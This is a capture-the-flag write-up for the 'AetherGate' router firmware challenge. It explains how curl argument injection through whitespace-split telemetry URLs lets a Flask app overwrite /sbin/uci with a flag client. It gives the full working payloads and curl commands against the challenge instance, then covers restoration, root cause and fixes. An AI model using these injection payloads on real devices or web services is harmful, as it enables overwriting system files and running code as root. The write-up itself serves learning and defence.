# AetherGate

**Category:** Misc / Firmware / Web  
**Difficulty:** Hard  
**Flag:** `DCTF{cb3fbfc9cbfd932f53b1168adf0591d70ba645738b25fb9551cc20435a86c2e9}`

## Challenge Overview

The challenge gave us a roughly 528 MiB router firmware image and a live web interface. The short description — “Router baban baaaa....” — did not reveal much, so the firmware itself was the obvious starting point.

The final bug was a curl argument-injection issue in the router's telemetry feature. The interesting part was not merely getting curl to read a local file. The real flag file is deleted from disk shortly after boot and kept behind a System V message queue, so the exploit had to invoke the firmware's bundled flag client and expose its output through the web application.

The flag was:

```text
DCTF{cb3fbfc9cbfd932f53b1168adf0591d70ba645738b25fb9551cc20435a86c2e9}
```

---

## 1. Inspecting the firmware image

I started by identifying the image and its partition layout:

```bash
file aethergate-firmware.img
fdisk -l aethergate-firmware.img
```

The image had a normal DOS/MBR partition table:

```text
Device                         Boot Start      End  Sectors  Size Id Type
aethergate-firmware.img1       *      512    33279    32768   16M 83 Linux
aethergate-firmware.img2            33792  1082367  1048576  512M 83 Linux
```

The first partition was a small ext2 filesystem labelled `kernel`, while the second was an ext4 filesystem labelled `rootfs`.

The root filesystem began at sector 33792, so its byte offset was:

```text
33792 * 512 = 17301504
```

I extracted it with `dd`:

```bash
dd if=aethergate-firmware.img \
   of=/tmp/aether-rootfs.img \
   bs=16M iflag=skip_bytes,count_bytes \
   skip=17301504 count=536870912
```

Then I unpacked the ext4 filesystem using `debugfs`:

```bash
mkdir -p /tmp/aether-rootfs
debugfs -R 'rdump / /tmp/aether-rootfs' /tmp/aether-rootfs.img
```

The extracted filesystem was small, around 62 MiB, and clearly based on OpenWrt. The files that immediately stood out were:

```text
/opt/webui/app.py
/opt/webui/ucilib.py
/opt/flag.txt
/opt/flagreader/readflag
/opt/flagreader/serveflag
/etc/init.d/webui
/etc/init.d/serveflag
/etc/uci-defaults/99-aethergate
```

At first glance, `/opt/flag.txt` looked promising:

```text
DCTF{training_flag_not_valid_on_remote}
```

As expected, this was only a local placeholder.

---

## 2. Understanding how the real flag is stored

The `serveflag` init script explained what happens on the live instance:

```sh
if [ -b /dev/vdb ]; then
    dd if=/dev/vdb of=/opt/flag.txt bs=256 count=1 2>/dev/null
fi

procd_set_param command /opt/flagreader/serveflag
```

The live flag is copied from a separate read-only block device into `/opt/flag.txt`, then the `serveflag` binary starts.

Disassembling `serveflag` revealed the rest of the design:

- It creates or opens a System V message queue with key `0x00c0c0ba`.
- It reads up to 256 bytes from `/opt/flag.txt`.
- It deletes `/opt/flag.txt` with `remove()`.
- It waits for a message of type 5 containing the string `Give flag :)`.
- If the message is correct, it sends the stored flag back in a message of type 4.

This is why simply asking curl to fetch `file:///opt/flag.txt` would not work on the running instance: by then, the daemon has already deleted the file.

Luckily, the firmware also includes `/opt/flagreader/readflag`. Searching its strings showed the same request text:

```text
Give flag :)
```

So `readflag` is the intended client for the message queue. If we can execute it on the router, it prints the real flag.

---

## 3. Reviewing the web application

The web interface is a Flask application. Most routes are ordinary router-management features: network settings, wireless settings, backups, and telemetry monitoring.

The important endpoints were:

```python
@app.post("/monitor/endpoints")
def monitor_save():
    body = request.get_json(silent=True) or {}
    saved = ucilib.set_monitor_endpoints(body.get("endpoints", []))
    return jsonify({"endpoints": saved})


@app.post("/monitor/run")
def monitor_run():
    return jsonify(ucilib.run_heartbeat())
```

The actual validation and command construction are in `ucilib.py`.

### Endpoint validation

Each telemetry endpoint is checked with Python's `urlparse()`:

```python
def _validate_endpoint(endpoint):
    if not isinstance(endpoint, str):
        raise UciError("endpoint must be a string")

    value = endpoint.strip()

    if _CONTROL_RE.search(value):
        raise UciError("endpoint contains control characters")

    parsed = urlparse(value)
    if parsed.scheme not in ("http", "https"):
        raise UciError("endpoint must be http(s): %r" % endpoint)

    host = parsed.hostname
    if host != TELEMETRY_DOMAIN and not host.endswith("." + TELEMETRY_DOMAIN):
        raise UciError("endpoint host %r is not on the telemetry grid" % host)

    return value
```

The hostname must be `aethergrid.net` or one of its subdomains. Control characters are rejected, but ordinary spaces are allowed.

That detail becomes critical because `urlparse()` accepts a value such as this and still sees the correct hostname:

```text
https://telemetry.aethergrid.net/heartbeat file:///etc/passwd -o /tmp/output
```

As far as the validator is concerned, this is one HTTP URL whose path happens to contain spaces and extra text.

### The vulnerable command construction

The saved value is later handled like this:

```python
def monitor_endpoints():
    raw = get_unchecked("aether", "monitor", "endpoint", "")
    if isinstance(raw, (list, tuple)):
        raw = " ".join(raw)
    return [item for item in raw.split() if item]
```

And then:

```python
def run_heartbeat():
    endpoints = monitor_endpoints()

    targets = " ".join(endpoints).split()
    argv = [
        "curl", "-sS", "--max-time", "5",
        "-o", "/dev/null",
        "-w", "%{url_effective} %{http_code}\\n",
    ] + targets

    out = _run(*argv)
```

There is no shell injection here because `subprocess.run()` receives an argument list. However, this is still **argument injection**.

The application validates one string as one URL, stores it, and later splits it on whitespace. Everything after the first space becomes a separate curl argument. That gives us additional URLs and curl options such as `file://` and `-o`.

Conceptually, the validated value:

```text
https://telemetry.aethergrid.net/heartbeat file:///some/file -o /some/output
```

becomes:

```bash
curl -sS --max-time 5 \
  -o /dev/null \
  -w '%{url_effective} %{http_code}\n' \
  https://telemetry.aethergrid.net/heartbeat \
  file:///some/file \
  -o /some/output
```

This lets curl copy local files around the filesystem as root.

---

## 4. Turning file-copy into code execution

At this point I could copy files but could not directly execute a command. The obvious idea — copy `/opt/flag.txt` into the Flask static directory — did not work because the real file had already been deleted by `serveflag`.

The useful primitive was the existing executable:

```text
/opt/flagreader/readflag
```

The next question was: which program could be temporarily replaced with `readflag` so that the web application would execute it and return its stdout?

The backup-export route was ideal:

```python
@app.get("/backup/export")
def export_backup():
    return Response(ucilib.export_all(), mimetype="text/plain; charset=utf-8")
```

`export_all()` runs the `uci` command once for every exportable package and concatenates stdout into the HTTP response:

```python
def export_all():
    exported = []
    for config in IMPORTABLE:
        exported.append(_run("uci", "export", config))
    return "".join(exported)
```

Therefore, if `/sbin/uci` temporarily becomes `readflag`, requesting `/backup/export` executes the flag client several times and returns the flag directly.

Because curl truncates an existing output file instead of replacing its inode, `/sbin/uci` keeps its executable permission bits. Before overwriting it, I used the same curl invocation to save a copy in `/tmp/uci.orig`.

The crafted endpoint was:

```text
https://telemetry.aethergrid.net/heartbeat file:///sbin/uci file:///opt/flagreader/readflag -o /tmp/uci.orig -o /sbin/uci
```

The web application already supplies the first `-o /dev/null`. Curl associates repeated output options with URLs in order:

1. The legitimate telemetry request goes to `/dev/null`.
2. `file:///sbin/uci` is copied to `/tmp/uci.orig`.
3. `file:///opt/flagreader/readflag` is copied over `/sbin/uci`.

This is a short-lived but potentially disruptive change, so I kept the request count minimal and restored the original binary immediately after reading the flag.

---

## 5. Exploitation

I used the following commands against the live instance. The target address below was the instance assigned during the solve and will not remain valid permanently.

```bash
TARGET='http://34.40.34.213:30849'
```

### Step 1: Save the crafted telemetry value

```bash
curl -sS \
  -H 'Content-Type: application/json' \
  --data-raw '{
    "endpoints": [
      "https://telemetry.aethergrid.net/heartbeat file:///sbin/uci file:///opt/flagreader/readflag -o /tmp/uci.orig -o /sbin/uci"
    ]
  }' \
  "$TARGET/monitor/endpoints"
```

The server accepted it:

```json
{
  "endpoints": [
    "https://telemetry.aethergrid.net/heartbeat file:///sbin/uci file:///opt/flagreader/readflag -o /tmp/uci.orig -o /sbin/uci"
  ]
}
```

### Step 2: Run the heartbeat once

```bash
curl -sS -X POST "$TARGET/monitor/run"
```

The response confirmed that curl had processed the injected `file://` URLs:

```json
{
  "checked": 7,
  "detail": "https://telemetry.aethergrid.net/heartbeat 000\nfile:///sbin/uci 000\nfile:///opt/flagreader/readflag 000",
  "ok": true
}
```

The strange `checked` value is another visible consequence of the whitespace splitting: one user-supplied endpoint had become seven tokens.

### Step 3: Export the backup

```bash
curl -sS "$TARGET/backup/export"
```

Instead of UCI configuration, the response contained the flag six times — once for each package that `export_all()` attempted to export:

```text
Flag: DCTF{cb3fbfc9cbfd932f53b1168adf0591d70ba645738b25fb9551cc20435a86c2e9}

Flag: DCTF{cb3fbfc9cbfd932f53b1168adf0591d70ba645738b25fb9551cc20435a86c2e9}

...
```

So the final answer was:

```text
DCTF{cb3fbfc9cbfd932f53b1168adf0591d70ba645738b25fb9551cc20435a86c2e9}
```

---

## 6. Restoring the service

Since `/sbin/uci` is central to OpenWrt, leaving it replaced would break much of the router interface. I restored it immediately with a second file-copy payload.

### Save the restoration endpoint

```bash
curl -sS \
  -H 'Content-Type: application/json' \
  --data-raw '{
    "endpoints": [
      "https://telemetry.aethergrid.net/heartbeat file:///tmp/uci.orig -o /sbin/uci"
    ]
  }' \
  "$TARGET/monitor/endpoints"
```

### Trigger restoration

```bash
curl -sS -X POST "$TARGET/monitor/run"
```

Finally, I restored the original telemetry endpoints:

```bash
curl -sS \
  -H 'Content-Type: application/json' \
  --data-raw '{
    "endpoints": [
      "https://telemetry.aethergrid.net/heartbeat",
      "https://status.aethergrid.net/ping"
    ]
  }' \
  "$TARGET/monitor/endpoints"
```

A final request to `/backup/export` once again returned normal UCI configuration beginning with `package network`, confirming that the original binary was working and the telemetry configuration had been reset.

---

## 7. Root cause

The bug came from validating data in one representation and using it in another.

During validation, the application treated each list element as one URL:

```text
one Python string -> one parsed URL
```

During execution, it treated whitespace inside that same string as argument separators:

```text
one validated string -> several curl arguments
```

The domain allowlist itself was not enough because it was applied before tokenization. The first token satisfied the allowlist, while the remaining tokens were never independently validated.

This was not traditional shell command injection. No semicolon, command substitution, or shell metacharacter was needed. It was an option/argument injection bug caused by the extra `.split()` before invoking curl.

---

## 8. How it should be fixed

The safest fix is to preserve the endpoint list as a list from validation through execution and never split endpoint strings on whitespace.

For example:

```python
def monitor_endpoints():
    raw = get_unchecked("aether", "monitor", "endpoint", ())
    if isinstance(raw, str):
        raw = (raw,)
    return list(raw)


def run_heartbeat():
    endpoints = monitor_endpoints()
    argv = [
        "curl",
        "-sS",
        "--max-time", "5",
        "-o", "/dev/null",
        "-w", "%{url_effective} %{http_code}\\n",
        "--",
        *endpoints,
    ]
```

Additional defensive measures would also help:

- Reject all whitespace in telemetry URLs.
- Add `--` before user-controlled URLs so values beginning with `-` cannot become options.
- Run the Flask service as an unprivileged user that cannot modify system binaries.
- Avoid making sensitive helper binaries such as `readflag` executable by the web-service account.
- Keep the flag broker in a separate privilege domain instead of sharing a root namespace with the management interface.

The most important lesson is simple: an allowlisted URL is only safe if the exact same string is passed as exactly one argument after validation.
